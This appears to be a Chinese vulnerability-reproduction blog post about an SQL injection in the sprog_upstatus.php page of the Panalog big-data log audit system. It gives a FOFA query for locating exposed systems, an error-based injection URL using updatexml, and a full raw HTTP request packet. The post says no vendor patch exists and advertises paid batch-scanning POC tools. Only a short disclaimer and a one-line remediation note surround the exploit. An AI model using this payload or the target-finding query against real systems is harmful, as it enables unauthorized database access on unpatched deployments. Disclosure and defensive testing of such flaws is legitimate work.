#  Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞 附POC   
2025-5-27更新  南风漏洞复现文库   2025-05-27 15:37  
  
   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Panalog大数据日志审计系统简介  
  
微信公众号搜索：南风漏洞复现文库  
  
该文章 南风漏洞复现文库 公众号首发  
  
panalog为一款流量分析,日志分析管理的一款软件。  
## 2.漏洞描述  
  
Panalog大数据日志审计系统定位于将大数据产品应用于高校、 公安、 政企、 医疗、 金融、 能源等行业之中，针对网络流量的信息进行日志留存，可对用户上网行为进行审计，逐渐形成大数据采集、 大数据分析、 大数据整合的工作模式，为各种网络用户提供服务。Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
Panalog大数据日志审计系统  
  
![Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6rakYzb9zGUhWud5Iq5sn4ttpCggsia3aPnFG0wWiaicibr1rhYYQdJudwYg/640?wx_fmt=png&from=appmsg "null")  
  
Panalog大数据日志审计系统sprog_upstatus.php存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="Panabit-Panalog"||body="Maintain/cloud_index.php"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,md5(1)),0)&rdb=1  
  
漏洞数据包：  
```
GET /Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,md5(1)),0)&rdb=1 HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: keep-aliveAccept-Encoding: gzip, deflate, br, zstdAccept-Language: zh-CN,zh;q=0.9Cache-Control: max-age=0Cookie: PHPSESSID=f8la8ttr74fkge0pttpc626p45
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6rpkPd7G4YjdvV8lY8MtHasuiaepUjdtibpj9Uw5NWyTdHzpy8Vsw8gAHA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
执行user(）函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6rDUaxXalf5ws4uuPEo62DicGvueEGlLib0Kia6SIzYsictc3N7eZWul3mjQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
  
  
2: 免登录，免费fofa查询。  
  
  
3: 更新其他实用网络安全工具项目。  
  
  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6r12Eicyz0icYHGuLic2K39q7TFm4XKIwb4QdDJblj8tnn1tuGB8OxeKQLg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6rZtsWOY6EVPyaTwNH3qCDwrCTdWp2t77g03W4vXXCoQRHbFiawpPb9MQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6rK26GbRoZKGVaqKTU1SHWt0NmKn4iaz0U7lT9wbicfPbNsu8Jp6aicoOrg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6riao82Nzxsd3d8XtgfpJ72UXO8M9N719h8sdFaVAibSztmrFP69AuFY5A/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ahJia65hKvBJ8oTmGsYdR6ra6vbRlGjnic8bq6Ot2lWoHD22rKHSichIOmnrpcicTFn9gUuguZUciaJVA/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：https://www.panabit.com/  
## 8.往期回顾  
  
  
   
  
